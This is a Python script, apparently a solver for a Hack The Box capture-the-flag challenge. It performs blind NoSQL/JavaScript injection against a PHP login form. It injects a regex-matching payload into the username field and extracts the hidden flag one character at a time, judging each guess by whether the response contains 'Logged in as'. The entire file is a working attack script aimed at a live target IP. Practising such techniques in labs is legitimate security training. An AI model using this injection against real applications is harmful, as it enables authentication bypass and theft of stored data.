import requests
import string
import time
import urllib.parse

# Target URL
URL = "http://94.237.54.190:40395/index.php"

# Headers to mimic a real request
HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# Possible characters in the username (adjust if needed)
CHARSET = string.ascii_letters + string.digits  # a-z, A-Z, 0-9

# Known prefix
username = "HTB{"  # Start with the known part

# Function to check if a guessed character is correct
def test_character(prefix, char):
    # Ensure the payload format is correct
    raw_payload = f'" || (this.username.match("^{prefix}{char}.*")) || ""=="'
    
    # Manually encode only specific special characters
    encoded_payload = urllib.parse.quote(raw_payload, safe="")  # Encode everything except alphanumeric characters
    
    payload = {
        "username": raw_payload,  # Sending raw payload instead of encoded
        "password": "password"
    }

    print(f"[*] Trying raw payload: {raw_payload}")  # Debugging
    
    response = requests.post(URL, data=payload, headers=HEADERS)
    
    response_text = response.text[:500]  # First 500 characters for better debugging
    response_length = len(response.text)
    
    print(f"[+] Response Status: {response.status_code}")
    print(f"[+] Response Length: {response_length}")  # Print response length
    print(f"[+] Response Snippet: {response_text}")  # Print a response snippet
    
    time.sleep(0.5)  # Adding delay to prevent rate-limiting
    
    # Check for successful login indicator using response content
    return "Logged in as" in response.text or "Nothing to see here" in response.text

# Function to extract the rest of the username
def extract_username():
    global username
    while True:
        found = False
        for char in CHARSET:
            if test_character(username, char):  # Check if char is correct
                username += char  # Append found character
                print(f"[+] Current username: {username}")
                found = True
                break  # Move to the next character
        
        if not found:  # If no new character was found, the extraction is complete
            print(f"[+] Final extracted username: {username}")
            break

if __name__ == "__main__":
    extract_username()
